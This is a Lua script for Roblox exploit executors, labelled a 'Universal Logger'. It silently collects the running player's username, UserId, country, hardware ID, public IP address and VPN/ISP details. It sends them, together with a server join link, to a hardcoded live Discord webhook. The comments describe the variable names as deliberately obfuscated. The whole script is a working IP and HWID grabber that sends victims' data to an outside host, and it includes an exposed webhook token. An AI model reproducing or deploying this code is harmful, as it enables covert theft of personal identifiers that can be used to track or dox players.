--[[
    Universal Logger - Stable Version
    Features: Crash protection, timeout handling, error recovery
]]

-- Safe wrapper to prevent crashes
local function safeCall(func, ...)
    local success, result = pcall(func, ...)
    return success, result
end

-- Request with timeout protection
local function safeRequest(options)
    local timeout = options.timeout or 5
    local result = nil
    local success = safeCall(function()
        local req = request or http_request or syn and syn.request
        if not req then return nil end
        
        -- Add timeout protection
        local co = coroutine.wrap(function()
            result = req(options)
        end)
        co()
        
        -- Simple timeout simulation (most executors handle this internally)
        local start = os.clock()
        while not result and os.clock() - start < timeout do
            task.wait()
        end
        return result
    end)
    return success and result
end

-- Obfuscated variable names
local a = game:GetService("HttpService")
local b = game:GetService("Players")
local c = game:GetService("MarketplaceService")
local d = game:GetService("LocalizationService")

local e = request or http_request or (syn and syn.request)
if not e then return end

local f = b.LocalPlayer
local g = "https://discord.com/api/webhooks/1455247951621521460/8yqUegsToCpf83OYRFPGQ7yN1TxVCFBODgi89dybM3B0tkGZYRFXXZQUEV9XISoKBO1V"

-- Safe game info fetch
local h = "Unknown Game"
safeCall(function()
    local i = c:GetProductInfo(game.PlaceId)
    if i and i.Name then
        h = i.Name
    end
end)

-- Safe join link
local j = "roblox://placeId=" .. game.PlaceId .. "&gameInstanceId=" .. (game.JobId or "")

-- Safe region fetch
local k = "Unknown"
safeCall(function()
    local l = d:GetCountryRegionForPlayerAsync(f)
    if l then
        k = l
    end
end)

-- Safe executor detection
local m = "Unknown"
safeCall(function()
    if identifyexecutor then
        m = identifyexecutor()
    end
end)

-- Safe HWID detection
local n = "Unknown"
safeCall(function()
    if syn and syn.get_hwid then
        n = syn.get_hwid()
    elseif get_hwid then
        n = get_hwid()
    elseif gethwid then
        n = gethwid()
    end
end)

-- Safe IP fetch with multiple fallbacks
local o = "Failed to fetch"
safeCall(function()
    local p = {
        "https://api.ipify.org",
        "https://api64.ipify.org",
        "https://icanhazip.com",
        "https://checkip.amazonaws.com"
    }
    
    for _, q in ipairs(p) do
        local r = safeRequest({
            Url = q,
            Method = "GET",
            timeout = 3
        })
        if r and r.Body and #r.Body > 0 and #r.Body < 20 then
            o = r.Body:gsub("%s+", "")
            if o:match("%d+%.%d+%.%d+%.%d+") then
                break
            end
        end
    end
end)

-- Safe VPN detection
local s = "Unknown"
safeCall(function()
    if o ~= "Failed to fetch" and o:match("%d+%.%d+%.%d+%.%d+") then
        local t = safeRequest({
            Url = "http://ip-api.com/json/" .. o .. "?fields=proxy,isp,countryCode",
            Method = "GET",
            timeout = 3
        })
        if t and t.Body then
            local u = a:JSONDecode(t.Body)
            if u then
                s = u.proxy and "âœ… VPN/Proxy" or "âŒ No"
                if u.isp then
                    s = s .. " | " .. u.isp
                end
                if u.countryCode then
                    s = s .. " | " .. u.countryCode
                end
            end
        end
    end
end)

-- Build embed data
local v = {
    embeds = {{
        title = "ðŸ›¡ï¸ | Universal Logger",
        color = 0x00AAFF,
        thumbnail = {
            url = "https://media.discordapp.net/attachments/1389612289371537549/1446840065979453480/SynthX_v4.png"
        },
        fields = {
            { name = "ðŸŽ® Game", value = "``" .. tostring(h) .. "``", inline = true },
            { name = "ðŸ‘¤ Username", value = "``" .. tostring(f.Name) .. "``", inline = true },
            { name = "ðŸ†” UserId", value = "``" .. tostring(f.UserId) .. "``", inline = true },
            { name = "ðŸŒ Country", value = "``" .. tostring(k) .. "``", inline = true },
            { name = "ðŸ–¥ï¸ Hardware ID", value = "```" .. tostring(n) .. "```", inline = false },
            { name = "ðŸŒ IP Address", value = "``" .. tostring(o) .. "``", inline = true },
            { name = "ðŸ” VPN Status", value = "``" .. tostring(s) .. "``", inline = true },
            { name = "ðŸ§  Executor", value = "``" .. tostring(m) .. "``", inline = true },
            { name = "ðŸ”— Join Link", value = "``" .. tostring(j) .. "``", inline = false }
        },
        footer = { text = "Universal Logs â€¢ " .. os.date("%Y-%m-%d %H:%M:%S") },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

-- Safe webhook send
safeCall(function()
    e({
        Url = g,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = a:JSONEncode(v)
    })
end)

-- Obfuscated success message (optional)
local w = {"L","o","g","g","e","d"," ","s","u","c","c","e","s","s","f","u","l","l","y","!"}
local x = ""
for y = 1, #w do x = x .. w[y] end
print(x)
